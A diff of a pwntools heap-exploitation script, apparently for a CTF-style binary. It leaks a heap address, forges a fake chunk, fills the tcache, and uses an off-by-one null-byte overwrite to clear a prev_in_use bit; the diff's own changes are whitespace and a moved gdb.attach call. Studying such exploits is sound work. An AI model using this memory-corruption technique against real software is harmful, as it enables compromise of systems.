@@ -23,10 +23,18 @@ heap_base_addr = leak << 12
 print(hex(leak << 12))
 
 
+
+
+
 p.sendline("malloc 1 56") # chunk A
 p.sendline("malloc 2 40") # chunk B 0x30
 
 p.sendline("malloc 3 248") # chunk C
+
+
+
+
+
 
 p.sendline("read_copy 1")
 
@@ -39,6 +47,7 @@ p.sendline(p64(0) + p64(0x60) + p64(fake_chunk_addr) + p64(fake_chunk_addr))
 
 
 p.sendline("read_copy 2")
+
 p.sendline(b"A" * 0x20 + p64(0x60))
 
 
@@ -46,7 +55,7 @@ for i in range(4, 11):
 	p.sendline(f"malloc {i} 248")
 for i in range(4, 11):
 	p.sendline(f"free {i}")
-	
+
 	
 
 
@@ -55,13 +64,13 @@ for i in range(4, 11):
 # 2. using off-by-one to write a null byte to the first byte one the size field of chunk C to clear out the Prev_in_use bit
 
 p.sendline("free 3")
-
+gdb.attach(p, s)
 
 p.sendline("malloc 12 344")
 
 p.sendline("read_copy 12")
 p.sendline(b"A" * 0x100)
-gdb.attach(p, s)
+
 
 
 
